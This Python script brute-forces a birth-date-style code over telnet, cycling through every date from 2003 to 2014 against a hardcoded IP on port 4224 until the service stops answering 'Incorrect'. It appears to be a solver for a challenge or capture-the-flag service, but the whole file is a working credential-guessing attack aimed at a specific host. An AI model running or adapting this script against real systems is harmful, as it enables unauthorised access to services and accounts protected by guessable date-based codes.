#!/usr/bin/env python3

from datetime import datetime, date, timedelta 
from telnetlib import Telnet
from time import sleep, time

IP="3.11.176.72"

resp = ""

def run(IP):

	print("Starting brute force...")
	for year in range(2003, 2015):

		# Initializing start date 
		start_date = date(int(year), 1, 1) # 1st Jaunary

		days = 366 if year%4 == 0 else 365

		for day_num in range(days):

			with Telnet(IP, 4224) as tn:
				day_num = str(day_num)
				day_num.rjust(3 + len(day_num), '0') 
				# converting to date 
				result_date = start_date + timedelta(days=int(day_num)) 
				result = str(result_date.strftime("%d%m%Y"))

				print(f"Trying {result}", end="\r")

				tn.read_until(b"code: ")
				tn.write(result.encode("ascii")+b"\n")
				resp = tn.read_all().decode("ascii")

				if not "Incorrect" in resp:
					print()
					print("Found!")
					print(f"Code: {result}\nResponse: {resp}")
					return

start = time()
run(IP)
print(f"Time taken: {time() - start:.2f}s")